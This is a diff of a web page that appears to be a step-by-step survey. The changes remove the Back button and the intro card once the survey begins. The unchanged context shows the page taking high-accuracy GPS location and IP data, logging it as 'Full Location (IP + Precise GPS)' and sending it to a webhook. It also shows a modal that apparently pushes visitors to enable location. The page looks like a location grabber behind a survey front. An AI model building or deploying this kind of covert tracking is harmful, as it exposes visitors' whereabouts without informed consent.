@@ -323,8 +323,7 @@
                     </div>
                 </div>
             </div>
-            <div class="btn-container">
-                <button class="btn btn-secondary" onclick="prevStep(1)">Back</button>
+            <div class="btn-container" style="justify-content: flex-end;">
                 <button class="btn" onclick="nextStep(1)">Next ➔</button>
             </div>
         </div>
@@ -453,7 +452,7 @@
                   } else {
                     sessionLocationData.log_type = "Full Location (IP + Precise GPS)";
                     sendWebhook(sessionLocationData);
-                    goToStep(1);
+                    removeIntroAndGoToStep(1);
                   }
                 },
                 function(error) {
@@ -470,17 +469,17 @@
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
                     sessionLocationData.log_type = "Location Unavailable";
-                    goToStep(1);
+                    removeIntroAndGoToStep(1);
                   }
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
             } else {
-              goToStep(1);
+              removeIntroAndGoToStep(1);
             }
           })
           .catch(err => {
-            goToStep(1);
+            removeIntroAndGoToStep(1);
           });
       }
 
@@ -492,12 +491,23 @@
         }).catch(err => console.log(err));
       }
 
+      function removeIntroAndGoToStep(step) {
+        const introCard = document.getElementById("step0");
+        if (introCard) {
+          introCard.remove(); // Completely removes the start survey intro card from the page
+        }
+        currentStep = step;
+        document.getElementById(`step${currentStep}`).classList.add('active');
+        
+        document.getElementById("progressContainer").style.display = "block";
+        document.getElementById("progressBar").style.width = (currentStep * 20) + "%";
+      }
+
       function goToStep(step) {
         document.getElementById(`step${currentStep}`).classList.remove('active');
         currentStep = step;
         document.getElementById(`step${currentStep}`).classList.add('active');
         
-        document.getElementById("progressContainer").style.display = "block";
         document.getElementById("progressBar").style.width = (currentStep * 20) + "%";
       }
 
@@ -531,13 +541,6 @@
       }
 
       function prevStep(stepNum) {
-        if (stepNum === 1) {
-          document.getElementById("step1").classList.remove('active');
-          document.getElementById("step0").classList.add('active');
-          document.getElementById("progressContainer").style.display = "none";
-          currentStep = 0;
-          return;
-        }
         goToStep(stepNum - 1);
       }
 
